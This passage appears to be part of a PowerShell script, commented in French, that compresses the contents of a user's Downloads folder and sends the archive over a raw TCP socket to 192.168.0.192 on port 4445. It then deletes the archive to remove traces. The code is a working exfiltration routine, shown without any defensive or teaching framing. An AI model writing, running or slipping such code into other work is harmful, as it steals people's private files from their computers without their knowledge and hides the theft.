# Compression du dossier Downloads
Compress-Archive -Path "$downloads\*" -DestinationPath $zip

# Connexion TCP et envoi du zip
$client = New-Object System.Net.Sockets.TcpClient("192.168.0.192", 4445)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes($zip)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()

# Nettoyage
Remove-Item $zip
